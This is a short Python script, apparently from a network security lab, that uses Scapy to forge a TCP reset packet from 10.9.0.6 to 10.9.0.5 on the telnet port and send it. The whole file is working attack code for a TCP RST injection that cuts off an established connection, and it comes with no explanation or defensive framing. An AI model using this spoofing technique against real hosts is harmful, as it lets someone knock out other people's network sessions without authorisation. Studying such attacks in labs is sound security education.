#!/usr/bin/env python3
from scapy.all import *

ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=45536, dport=23, flags="R", seq=89, ack=1)
pkt = ip/tcp
ls(pkt)
send(pkt, verbose=0)